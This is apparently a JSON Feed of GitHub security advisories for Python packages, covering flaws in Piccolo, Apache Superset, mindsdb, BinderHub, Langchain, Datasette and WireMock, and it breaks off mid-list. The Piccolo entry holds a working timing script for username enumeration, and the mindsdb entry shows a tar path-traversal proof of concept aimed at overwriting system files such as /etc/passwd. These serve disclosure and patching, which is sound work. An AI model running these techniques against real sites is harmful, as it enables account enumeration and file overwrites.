{
    "version": "https://jsonfeed.org/version/1",
    "title": "Security Advisory for Python packages hosted at PyPI.org",
    "home_page_url": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Apip",
    "feed_url": "https://azu.github.io/github-advisory-database-rss/pip.json",
    "description": "Security Advisory for Python packages hosted at PyPI.org on GitHub",
    "items": [
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p><em>Short summary of the problem. Make the impact and severity as clear as possible. For example: An unsafe deserialization vulnerability allows any unauthenticated user to execute arbitrary code on the server.</em></p>\n<p>The current implementation of <code>BaseUser.login</code> leaks enough information to a malicious user such that they would be able to successfully generate a list of valid users on the platform. As Piccolo on it's own does not also enforce strong passwords (see <a href=\"https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html#implement-proper-password-strength-controls\">here</a>), these lists of valid accounts are likely to be used in a password spray attack with the outcome being attempted takeover of user accounts on the platform.</p>\n<p>The impact of this vulnerability is minor as it requires chaining with other attack vectors in order to gain more then simply a list of valid users on the underlying platform.\nThe likelihood of this vulnerability is possible as it requires minimal skills to pull off especially given the underlying login functionality for Piccolo based sites is open source.</p>\n<h3 id=\"details\">Details</h3>\n<p><em>Give all details on the vulnerability. Pointing to the incriminated source code is very helpful for the maintainer.</em></p>\n<p>This vulnerability relates to <a href=\"https://github.com/piccolo-orm/piccolo/blob/master/piccolo/apps/user/tables.py#L191-L237\">this</a> code. Specifically the fact that responses are not returned in constant time, but rather are based off the internal state.</p>\n<p>For example, if a user does not exist then <code>None</code> is returned immediately instead of encountering a time expensive hash comparison (Line 225). This discrepancy allows a malicious user to time requests made in order to generate a list of usernames which are valid on the underlying platform for usage in further attacks.</p>\n<p>If your curious for some more information regarding this attack avenue, I wrote a blog post awhile back with a similar chain to this with some other types of analysis. It lives <a href=\"https://skelmis.co.nz/posts/tbue/\">here</a>. </p>\n<h3 id=\"poc\">PoC</h3>\n<p><em>Complete instructions, including specific configuration details, to reproduce the vulnerability.</em></p>\n<h4 id=\"piccolo-setup\">Piccolo Setup</h4>\n<ol>\n<li>In a fresh environment <code>pip install 'piccolo[all]'</code> and <code>piccolo asgi new</code></li>\n<li>For simplified testing purposes, in <code>piccolo_conf.py</code> modify Piccolo to use SQLite:</li>\n</ol>\n<pre><code class=\"language-python\">from piccolo.engine.sqlite import SQLiteEngine\nDB = SQLiteEngine()\n</code></pre>\n<ol start=\"3\">\n<li>In the same file, add the required apps for session authentication. The file should look like the following:</li>\n</ol>\n<pre><code class=\"language-python\">from piccolo.engine.sqlite import SQLiteEngine\nfrom piccolo.conf.apps import AppRegistry\n\n\nDB = SQLiteEngine()\n\nAPP_REGISTRY = AppRegistry(\n    apps=[\n        \"home.piccolo_app\",\n        \"piccolo_admin.piccolo_app\",\n        \"piccolo_api.session_auth.piccolo_app\",\n        \"piccolo.apps.user.piccolo_app\",\n    ]\n)\n</code></pre>\n<ol start=\"4\">\n<li>Run the following migrations:</li>\n</ol>\n<pre><code class=\"language-text\">piccolo migrations forwards user\npiccolo migrations forwards session_auth\n</code></pre>\n<ol start=\"5\">\n<li>Within <code>app.py</code>, mount <code>session_login</code> at the <code>/login</code> path as follows:</li>\n</ol>\n<pre><code class=\"language-python\">from piccolo_api.session_auth.endpoints import session_login\napp.mount(\"/login\", session_login())\n</code></pre>\n<ol start=\"6\">\n<li>Create a new user using <code>piccolo user create</code>, making a note of the username and password for later steps.</li>\n</ol>\n<h4 id=\"exploitation\">Exploitation</h4>\n<p>The following Python script can be used to reproduce this issue. It could also be expanded to easily take in user lists to conduct user enumeration at scale, however, that is outside the scope of this report.</p>\n<pre><code class=\"language-python\">import asyncio\nimport time\nfrom collections import defaultdict\n\nimport httpx\n\nnumber_of_attempts = 50\n# Set this to the username from step 6.\nvalid_username = \"skelmis\"\ninvalid_username = \"invalid\"\ndata = defaultdict(lambda: [])\n# Ensure this points to your current enviroment\nlocal_base_url = \"http://127.0.0.1:8000\"\n# Set this to the password from step 6.\nvalid_password = \"disobey-blunt-kindly-postbox-tarantula\"\ninvalid_password = \"cabana-polar-secrecy-neurology-pacific\"\n\n\nasync def make_request(username, password, session: httpx.AsyncClient):\n    start_time = time.time()\n    resp = await session.post(\n        f\"{local_base_url}/login\",\n        json={\"username\": username, \"password\": password},\n        follow_redirects=True,\n    )\n    end_time = time.time()\n    if username == valid_username and password == valid_password:\n        # Just sanity check expected passes are passing\n        assert resp.status_code == 200\n\n    resultant_time = end_time - start_time\n    data[f\"{username}|{password}\"].append(resultant_time)\n\n\nasync def main():\n    async with httpx.AsyncClient() as client:\n        # This is the baseline correct request\n        for _ in range(number_of_attempts):\n            await make_request(valid_username, valid_password, client)\n            await asyncio.sleep(0.1)\n\n        # This is for a valid user but invalid password\n        for _ in range(number_of_attempts):\n            await make_request(valid_username, invalid_password, client)\n            await asyncio.sleep(0.1)\n\n        # This is for an invalid user and password\n        for _ in range(number_of_attempts):\n            await make_request(invalid_username, invalid_password, client)\n            await asyncio.sleep(0.1)\n\n        r_1 = data[f\"{valid_username}|{valid_password}\"]\n        r_2 = data[f\"{valid_username}|{invalid_password}\"]\n        r_3 = data[f\"{invalid_username}|{invalid_password}\"]\n\n        r_1_sum = sum(r_1) / len(r_1)\n        r_2_sum = sum(r_2) / len(r_2)\n        r_3_sum = sum(r_3) / len(r_3)\n\n        print(\n            f\"Average time to response as a valid user with a valid password: {r_1_sum}\"\n        )\n        print(\n            f\"Average time to response as a valid user with an invalid password: {r_2_sum}\"\n        )\n        print(\n            f\"Average time to response as an invalid user with an invalid password: {r_3_sum}\"\n        )\n\n\nif __name__ == \"__main__\":\n    asyncio.run(main())\n</code></pre>\n<p>N.B. This script makes 50 requests per username/password combination in order to be more certain of the time to response for each combination</p>\n<h4 id=\"analysis\">Analysis</h4>\n<p>The following is the output from the PoC against <code>pip install piccolo</code>\n<img alt=\"Screenshot from 2023-09-08 18-36-45\" src=\"https://user-images.githubusercontent.com/47520067/266522913-b8a0f499-e38b-47fd-a97d-292900320a01.png\"></p>\n<p>The following is the output from the PoC against <code>pip install git+https://github.com/piccolo-orm/piccolo.git</code>.\n<img alt=\"Screenshot from 2023-09-08 17-51-16\" src=\"https://user-images.githubusercontent.com/47520067/266514350-82384ce6-c24f-4b89-8516-ec08282053e1.png\"></p>\n<p>I have included the results from both versions to highlight that this issue is not as a result of <a href=\"https://github.com/piccolo-orm/piccolo/pull/881\">this</a> pull request but as a result of the underlying logic in usage.</p>\n<p>Both of these runs clearly show a noticeable difference in the time to response for valid and invalid users which would allow a malicious user to build up a list of users for usage in further attacks against the website. For example, after building up a user list a malicious user may then conduct a <a href=\"https://owasp.org/www-community/attacks/Password_Spraying_Attack\">password spray attack</a> using common passwords in order to takeover user accounts on the platform.</p>\n<h3 id=\"impact\">Impact</h3>\n<p><em>What kind of vulnerability is it? Who is impacted?</em></p>\n<p>This is an information disclosure vulnerability. \nIt would affect any Piccolo site, and all users of said Piccolo site who can login via regular login portals.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/piccolo-orm/piccolo/security/advisories/GHSA-h7cm-mrvq-wcfr\">https://github.com/piccolo-orm/piccolo/security/advisories/GHSA-h7cm-mrvq-wcfr</a></li>\n<li><a href=\"https://github.com/piccolo-orm/piccolo/commit/edcfe3568382922ba3e3b65896e6e7272f972261\">https://github.com/piccolo-orm/piccolo/commit/edcfe3568382922ba3e3b65896e6e7272f972261</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-h7cm-mrvq-wcfr\">https://github.com/advisories/GHSA-h7cm-mrvq-wcfr</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-h7cm-mrvq-wcfr",
            "title": "[piccolo] Piccolo's current `BaseUser.login` implementation is vulnerable to time based user enumeration",
            "date_modified": "2023-09-12T13:50:24.000Z",
            "date_published": "2023-09-12T13:50:23.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-h7cm-mrvq-wcfr"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>An improper default REST API permission for Gamma users in Apache Superset up to and including 2.1.0 allows for an authenticated Gamma user to test database connections.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2023-36387\">https://nvd.nist.gov/vuln/detail/CVE-2023-36387</a></li>\n<li><a href=\"https://lists.apache.org/thread/tt6s6hm8nv6s11z8bfsk3r3d9ov0ogw3\">https://lists.apache.org/thread/tt6s6hm8nv6s11z8bfsk3r3d9ov0ogw3</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-9832-mgg4-3gr6\">https://github.com/advisories/GHSA-9832-mgg4-3gr6</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-9832-mgg4-3gr6",
            "title": "[apache-superset] Apache Superset has improper default REST API permission for Gamma users",
            "date_modified": "2023-09-11T18:09:46.000Z",
            "date_published": "2023-09-06T15:30:26.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-9832-mgg4-3gr6"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>An unsafe extraction is being performed using <code>tarfile.extractall()</code> from a remotely retrieved tarball. Which may lead to the writing of the extracted files to an unintended location. Sometimes, the vulnerability is called a TarSlip or a ZipSlip variant.</p>\n<h3 id=\"details\">Details</h3>\n<p>I commented the following snippet of code as a vulnerability details. The code is from <a href=\"https://github.com/mindsdb/mindsdb/blob/afedd37c16e579b6dc075b0814e42d0505ccdc07/mindsdb/api/http/namespaces/file.py#L26..L134\">file.py#L26..L134</a></p>\n<pre><code class=\"language-python\">@ns_conf.route('/&lt;name&gt;')\n@ns_conf.param('name', \"MindsDB's name for file\")\nclass File(Resource):\n    @ns_conf.doc('put_file')\n    def put(self, name: str):\n        ''' add new file\n            params in FormData:\n                - file\n                - original_file_name [optional]\n        '''\n\n        data = {}\n\n        ... omitted for brevity\n\n            url = data['source']\n            data['file'] = data['name']\n\n            ... omitted for brevity \n\n            with requests.get(url, stream=True) as r:                   # Source: retrieve the URL which point to a remotely located tarball \n                if r.status_code != 200:\n                    return http_error(\n                        400,\n                        \"Error getting file\",\n                        f\"Got status code: {r.status_code}\"\n                    )\n                file_path = os.path.join(temp_dir_path, data['file'])\n                with open(file_path, 'wb') as f:\n                    for chunk in r.iter_content(chunk_size=8192):   # write with chunks the remote retrieved file into file_path location \n                        f.write(chunk)\n\n        original_file_name = data.get('original_file_name')\n\n        file_path = os.path.join(temp_dir_path, data['file'])      \n        lp = file_path.lower()\n        if lp.endswith(('.zip', '.tar.gz')):\n            if lp.endswith('.zip'):\n                with zipfile.ZipFile(file_path) as f:\n                    f.extractall(temp_dir_path)\n            elif lp.endswith('.tar.gz'):\n                with tarfile.open(file_path) as f:  # Just after \n                    f.extractall(temp_dir_path)  # Sink: the tarball located by file_path is supposed to be extracted to temp_dir_path. \n</code></pre>\n<p>So, a remotely available tarball is being retrieved and written to the server filesystem in chunks, and then, if the extension ends with <code>.tar.gz</code> of a compressed tarball, the mindsdb app applies <code>tarfile.extractall()</code> directly with no checks for the destination. </p>\n<p>However, according to the following <a href=\"https://docs.python.org/3/library/tarfile.html#tarfile.TarFile.extractall\">warning</a> from the official documentation;</p>\n<blockquote>\n<p>Warning: Never extract archives from untrusted sources without prior inspection. It is possible that files are created outside of path, e.g. members that have absolute filenames starting with \"/\" or filenames with two dots \"..\". </p>\n</blockquote>\n<h3 id=\"poc\">PoC</h3>\n<p>The following PoC is provided for illustration purposes only. It showcases the risk of extracting a non-harmless text file <code>sim4n6.txt</code> to one of the parent locations rather than the intended current folder.</p>\n<pre><code class=\"language-bash\">&gt; tar --list -v -f archive.tar.gz\ntar: Removing leading \"../../../\" from member names\n../../../sim4n6.txt\n\n&gt; python3 \nPython 3.10.6 (main, Nov  2 2022, 18:53:38) [GCC 11.3.0] on linux\nType \"help\", \"copyright\", \"credits\" or \"license\" for more information.\n&gt;&gt;&gt; import tarfile\n&gt;&gt;&gt; with tarfile.open(\"archive.tar.gz\") as tf:\n&gt;&gt;&gt;         tf.extractall()\n&gt;&gt;&gt; exit()\n\n&gt; test -f ../../../sim4n6.txt &amp;&amp; echo \"sim4n6.txt exists\"\nsim4n6.txt exists\n</code></pre>\n<h3 id=\"attack-scenario\">Attack Scenario</h3>\n<p>An attacker could craft a malicious tarball with a filename path, such as ../../../../../../../../etc/passwd, and then serve the archive remotely, proceed to the PUT request of the tarball through mindsdb and overwrite the system files of the hosting server for instance.</p>\n<h3 id=\"mitigation\">Mitigation</h3>\n<p>Potential mitigation could be to:</p>\n<ul>\n<li>Use a safer module, like <code>zipfile</code>.</li>\n<li>Use an alternative of <code>tarfile</code>, such as <code>tarsafe</code>. </li>\n<li>Validate the location or the absolute path of the extracted files and discard those with malicious paths such as relative path <code>../../..</code> or absolute path such as <code>/etc/password</code>. A simple wrapper could be written to raise an exception when a path traversal may be identified.</li>\n</ul>\n<p>This is similar to the other report <a href=\"https://github.com/mindsdb/mindsdb/security/advisories/GHSA-7x45-phmr-9wqp\">GHSA-7x45-phmr-9wqp</a>.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/mindsdb/mindsdb/security/advisories/GHSA-2g5w-29q9-w6hx\">https://github.com/mindsdb/mindsdb/security/advisories/GHSA-2g5w-29q9-w6hx</a></li>\n<li><a href=\"https://github.com/mindsdb/mindsdb/blob/afedd37c16e579b6dc075b0814e42d0505ccdc07/mindsdb/api/http/namespaces/file.py#L26..L134\">https://github.com/mindsdb/mindsdb/blob/afedd37c16e579b6dc075b0814e42d0505ccdc07/mindsdb/api/http/namespaces/file.py#L26..L134</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2023-30620\">https://nvd.nist.gov/vuln/detail/CVE-2023-30620</a></li>\n<li><a href=\"https://github.com/mindsdb/mindsdb/commit/4419b0f0019c000db390b54d8b9d06e1d3670039\">https://github.com/mindsdb/mindsdb/commit/4419b0f0019c000db390b54d8b9d06e1d3670039</a></li>\n<li><a href=\"https://github.com/mindsdb/mindsdb/releases/tag/v23.2.1.0\">https://github.com/mindsdb/mindsdb/releases/tag/v23.2.1.0</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-2g5w-29q9-w6hx\">https://github.com/advisories/GHSA-2g5w-29q9-w6hx</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-2g5w-29q9-w6hx",
            "title": "[mindsdb] mindsdb arbitrary file write when extracting a remotely retrieved Tarball",
            "date_modified": "2023-09-10T05:03:11.000Z",
            "date_published": "2023-03-30T21:42:48.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-2g5w-29q9-w6hx"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>The parser cache functionality in parsergenerator.py in RPLY (aka python-rply) before 0.7.1 allows local users to spoof cache data by pre-creating a temporary rply-*.json file with a predictable name.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2014-1604\">https://nvd.nist.gov/vuln/detail/CVE-2014-1604</a></li>\n<li><a href=\"https://github.com/alex/rply/commit/fc9bbcd25b0b4f09bbd6339f710ad24c129d5d7c\">https://github.com/alex/rply/commit/fc9bbcd25b0b4f09bbd6339f710ad24c129d5d7c</a></li>\n<li><a href=\"https://exchange.xforce.ibmcloud.com/vulnerabilities/90593\">https://exchange.xforce.ibmcloud.com/vulnerabilities/90593</a></li>\n<li><a href=\"http://bugs.debian.org/cgi-bin/bugreport.cgi?bug=735263\">http://bugs.debian.org/cgi-bin/bugreport.cgi?bug=735263</a></li>\n<li><a href=\"http://www.openwall.com/lists/oss-security/2014/01/17/8\">http://www.openwall.com/lists/oss-security/2014/01/17/8</a></li>\n<li><a href=\"http://www.openwall.com/lists/oss-security/2014/01/18/4\">http://www.openwall.com/lists/oss-security/2014/01/18/4</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-9gcf-pq99-rjw3\">https://github.com/advisories/GHSA-9gcf-pq99-rjw3</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-9gcf-pq99-rjw3",
            "title": "[RPLY] RPLY Predictable Tmpfile Names Allows Cache Spoofing",
            "date_modified": "2023-09-10T05:03:07.000Z",
            "date_published": "2022-05-17T01:27:10.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-9gcf-pq99-rjw3"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>A remote code execution vulnerability has been identified in BinderHub, where providing BinderHub with maliciously crafted input could execute code in the BinderHub context, with the potential to egress credentials of the BinderHub deployment, including JupyterHub API tokens, kubernetes service accounts, and docker registry credentials. This may provide the ability to manipulate images and other user created pods in the deployment, with the potential to escalate to the host depending on the underlying kubernetes configuration.</p>\n<h3 id=\"patches\">Patches</h3>\n<p>Patch below, or <a href=\"https://github.com/jupyterhub/binderhub/commit/195caac172690456dcdc8cc7a6ca50e05abf8182.patch\">on GitHub</a></p>\n<pre><code class=\"language-diff\">From 9f4043d9dddc1174920e687773f27b7933f48ab6 Mon Sep 17 00:00:00 2001\nFrom: Riccardo Castellotti &lt;rcastell@cern.ch&gt;\nDate: Thu, 19 Aug 2021 15:49:43 +0200\nSubject: [PATCH] Explicitly separate git-ls-remote options from positional\n arguments\n\n---\n binderhub/repoproviders.py | 2 +-\n 1 file changed, 1 insertion(+), 1 deletion(-)\n\ndiff --git a/binderhub/repoproviders.py b/binderhub/repoproviders.py\nindex f33347b..5d4b87c 100755\n--- a/binderhub/repoproviders.py\n+++ b/binderhub/repoproviders.py\n@@ -484,7 +484,7 @@ class GitRepoProvider(RepoProvider):\n             self.sha1_validate(self.unresolved_ref)\n         except ValueError:\n             # The ref is a head/tag and we resolve it using `git ls-remote`\n-            command = [\"git\", \"ls-remote\", self.repo, self.unresolved_ref]\n+            command = [\"git\", \"ls-remote\", \"--\", self.repo, self.unresolved_ref]\n             result = subprocess.run(command, universal_newlines=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)\n             if result.returncode:\n                 raise RuntimeError(\"Unable to run git ls-remote to get the `resolved_ref`: {}\".format(result.stderr))\n-- \n2.25.1\n</code></pre>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p>Disable the git repo provider by specifying the <code>BinderHub.repo_providers</code> config, e.g.:</p>\n<pre><code class=\"language-python\">from binderhub.repoproviders import (GitHubRepoProvider,\n                            GitLabRepoProvider, GistRepoProvider,\n                            ZenodoProvider, FigshareProvider, HydroshareProvider,\n                            DataverseProvider)\n\nc.BinderHub.repo_providers =  {\n            'gh': GitHubRepoProvider,\n            'gist': GistRepoProvider,\n            'gl': GitLabRepoProvider,\n            'zenodo': ZenodoProvider,\n            'figshare': FigshareProvider,\n            'hydroshare': HydroshareProvider,\n            'dataverse': DataverseProvider,\n        }\n</code></pre>\n<h3 id=\"references\">References</h3>\n<p>Credit: Jose Carlos Luna Duran (CERN) and Riccardo Castellotti (CERN).</p>\n<h3 id=\"for-more-information\">For more information</h3>\n<p>If you have any questions or comments about this advisory:</p>\n<ul>\n<li>Email us at <a href=\"mailto:security@ipython.org\">security@ipython.org</a></li>\n</ul>\n<h3 id=\"references-1\">References</h3>\n<ul>\n<li><a href=\"https://github.com/jupyterhub/binderhub/security/advisories/GHSA-9jjr-qqfp-ppwx\">https://github.com/jupyterhub/binderhub/security/advisories/GHSA-9jjr-qqfp-ppwx</a></li>\n<li><a href=\"https://github.com/jupyterhub/binderhub/commit/195caac172690456dcdc8cc7a6ca50e05abf8182.patch\">https://github.com/jupyterhub/binderhub/commit/195caac172690456dcdc8cc7a6ca50e05abf8182.patch</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2021-39159\">https://nvd.nist.gov/vuln/detail/CVE-2021-39159</a></li>\n<li><a href=\"https://github.com/jupyterhub/binderhub/commit/195caac172690456dcdc8cc7a6ca50e05abf8182\">https://github.com/jupyterhub/binderhub/commit/195caac172690456dcdc8cc7a6ca50e05abf8182</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-9jjr-qqfp-ppwx\">https://github.com/advisories/GHSA-9jjr-qqfp-ppwx</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-9jjr-qqfp-ppwx",
            "title": "[binderhub] remote code execution via git repo provider",
            "date_modified": "2023-09-09T05:05:34.000Z",
            "date_published": "2021-08-30T16:16:58.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-9jjr-qqfp-ppwx"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>Langchain 0.0.171 is vulnerable to Arbitrary Code Execution via command injection in the <code>jira.run()</code> command</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2023-34540\">https://nvd.nist.gov/vuln/detail/CVE-2023-34540</a></li>\n<li><a href=\"https://github.com/hwchase17/langchain/issues/4833\">https://github.com/hwchase17/langchain/issues/4833</a></li>\n<li><a href=\"https://github.com/pypa/advisory-database/tree/main/vulns/langchain/PYSEC-2023-91.yaml\">https://github.com/pypa/advisory-database/tree/main/vulns/langchain/PYSEC-2023-91.yaml</a></li>\n<li><a href=\"https://github.com/langchain-ai/langchain/commit/a2f191a32229256dd41deadf97786fe41ce04cbb\">https://github.com/langchain-ai/langchain/commit/a2f191a32229256dd41deadf97786fe41ce04cbb</a></li>\n<li><a href=\"https://github.com/langchain-ai/langchain/issues/4833\">https://github.com/langchain-ai/langchain/issues/4833</a></li>\n<li><a href=\"https://github.com/langchain-ai/langchain/pull/6992\">https://github.com/langchain-ai/langchain/pull/6992</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-x32c-59v5-h7fg\">https://github.com/advisories/GHSA-x32c-59v5-h7fg</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-x32c-59v5-h7fg",
            "title": "[langchain] Langchain OS Command Injection vulnerability",
            "date_modified": "2023-09-09T05:03:49.000Z",
            "date_published": "2023-06-14T15:30:39.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-x32c-59v5-h7fg"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>This bug affects Datasette instances running a Datasette 1.0 alpha - 1.0a0, 1.0a1, 1.0a2 or 1.0a3 - in an online accessible location but with authentication enabled using a plugin such as <a href=\"https://datasette.io/plugins/datasette-auth-passwords\">datasette-auth-passwords</a>.</p>\n<p>The <code>/-/api</code> API explorer endpoint could reveal the names of both databases and tables - but not their contents - to an unauthenticated user.</p>\n<h3 id=\"patches\">Patches</h3>\n<p>Datasette 1.0a4 has a fix for this issue.</p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p>To work around this issue, block all traffic to the <code>/-/api</code> endpoint. This can be done with a proxy such as Apache or NGINX, or by installing the <a href=\"https://datasette.io/plugins/datasette-block\">datasette-block</a> plugin and adding the following configuration to your <code>metadata.json</code> or <code>metadata.yml</code> file:</p>\n<pre><code class=\"language-json\">{\n    \"plugins\": {\n        \"datasette-block\": {\n            \"prefixes\": [\"/-/api\"]\n        }\n    }\n}\n</code></pre>\n<p>This will block access to the API explorer but will still allow access to the Datasette read or write JSON APIs, as those use different URL patterns within the Datasette <code>/database</code> hierarchy.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/simonw/datasette/security/advisories/GHSA-7ch3-7pp7-7cpq\">https://github.com/simonw/datasette/security/advisories/GHSA-7ch3-7pp7-7cpq</a></li>\n<li><a href=\"https://github.com/simonw/datasette/commit/01e0558825b8f7ec17d3b691aa072daf122fcc74\">https://github.com/simonw/datasette/commit/01e0558825b8f7ec17d3b691aa072daf122fcc74</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2023-40570\">https://nvd.nist.gov/vuln/detail/CVE-2023-40570</a></li>\n<li><a href=\"https://github.com/pypa/advisory-database/tree/main/vulns/datasette/PYSEC-2023-154.yaml\">https://github.com/pypa/advisory-database/tree/main/vulns/datasette/PYSEC-2023-154.yaml</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-7ch3-7pp7-7cpq\">https://github.com/advisories/GHSA-7ch3-7pp7-7cpq</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-7ch3-7pp7-7cpq",
            "title": "[datasette] Datasette 1.0 alpha series leaks names of databases and tables to unauthenticated users",
            "date_modified": "2023-09-09T05:03:49.000Z",
            "date_published": "2023-08-22T18:06:46.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-7ch3-7pp7-7cpq"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>The proxy mode of WireMock, can be protected by the network restrictions configuration, as documented in <a href=\"https://wiremock.org/docs/configuration/#preventing-proxying-to-and-recording-from-specific-target-addresses\">Preventing proxying to and recording from specific target addresses</a>. These restrictions can be configured using the domain names, and in such a case the configuration is vulnerable to the DNS rebinding attacks. A similar patch was applied in WireMock 3.0.0-beta-15 for the WireMock Webhook Extensions.</p>\n<p>The root cause of the attack is a defect in the logic which allows for a race condition triggered by a DNS server whose address expires in between the initial validation and the outbound network request that might go to a domain that was supposed to be prohibited. Control over a DNS service is required to exploit this attack, so it has high execution complexity and limited impact.</p>\n<h3 id=\"affected-versions\">Affected versions</h3>\n<ul>\n<li>WireMock 3,x until 3.0.3 (security patch), on default settings in environments with access to the network</li>\n<li>WireMock 2.x until 2.35.1 (security patch), on default settings in environments with access to the network</li>\n<li>Python WireMock until 2.6.1</li>\n<li>WireMock Studio - all versions, this proprietary product was discontinued in 2022</li>\n</ul>\n<h3 id=\"patches\">Patches</h3>\n<ul>\n<li>WireMock 3.0.3 + the 3.0.3-1 Docker image</li>\n<li>WireMock 2.35.1 + the 2.35.1-1 Docker image - backport to WireMock 2.x</li>\n<li>Python WireMock 2.6.1</li>\n</ul>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p>For WireMock:</p>\n<ul>\n<li>Option 1: Configure WireMock to use IP addresses instead of the domain names in the outbound URLs subject to DNS rebinding</li>\n<li>Option 2: Use external firewall rules to define the list of permitted destinations</li>\n</ul>\n<p>For WireMock Studio: N/A. Switch to another distribution, there will be no fix provided. The vendor of former WireMock Studio recommends migration to <a href=\"https://www.wiremock.io/product\">WireMock Cloud</a></p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li>CVE-2023-41327 - Related issue in the WireMock Webhooks Extension</li>\n</ul>\n<h3 id=\"references-1\">References</h3>\n<ul>\n<li><a href=\"https://github.com/wiremock/wiremock/security/advisories/GHSA-pmxq-pj47-j8j4\">https://github.com/wiremock/wiremock/security/advisories/GHSA-pmxq-pj47-j8j4</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2023-41329\">https://nvd.nist.gov/vuln/detail/CVE-2023-41329</a></li>\n<li><a href=\"https://wiremock.org/docs/configuration/#preventing-proxying-to-and-recording-from-specific-target-addresses\">https://wiremock.org/docs/configuration/#preventing-proxying-to-and-recording-from-specific-target-addresses</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-pmxq-pj47-j8j4\">https://github.com/advisories/GHSA-pmxq-pj47-j8j4</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-pmxq-pj47-j8j4",
            "title": "[wiremock] Domain restrictions bypass via DNS Rebinding in WireMock and WireMock Studio webhooks, proxy and recorder modes",
            "date_modified": "2023-09-08T12:19:49.000Z",
            "date_published": "2023-09-08T12:19:49.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-pmxq-pj47-j8j4"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>Apache Superset would allow for SQLite database connections to be incorrectly registered when an attacker uses alternative driver names like&nbsp;sqlite+pysqlite or by using database imports. This could allow for unexpected file creation on Superset webservers. Additionally, if Apache Superset is using a SQLite database for its metadata (not advised for production use) it could result in more severe vulnerabilities related to confidentiality and integrity.&nbsp;This vulnerability exists in Apache Superset versions up to and including 2.1.0.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2023-39265\">https://nvd.nist.gov/vuln/detail/CVE-2023-39265</a></li>\n<li><a href=\"https://lists.apache.org/thread/pwdzsdmv4g5g1n2h9m7ortfnxmhr7nfy\">https://lists.apache.org/thread/pwdzsdmv4g5g1n2h9m7ortfnxmhr7nfy</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-fm4q-j8g4-c9j4\">https://github.com/advisories/GHSA-fm4q-j8g4-c9j4</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-fm4q-j8g4-c9j4",
            "title": "[apache-superset] Apache Superset Improper Input Validation vulnerability",
            "date_modified": "2023-09-08T12:19:18.000Z",
            "date_published": "2023-09-06T15:30:27.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-fm4q-j8g4-c9j4"
            },
            "tags": [
                "severity"
            ]
        },
        {
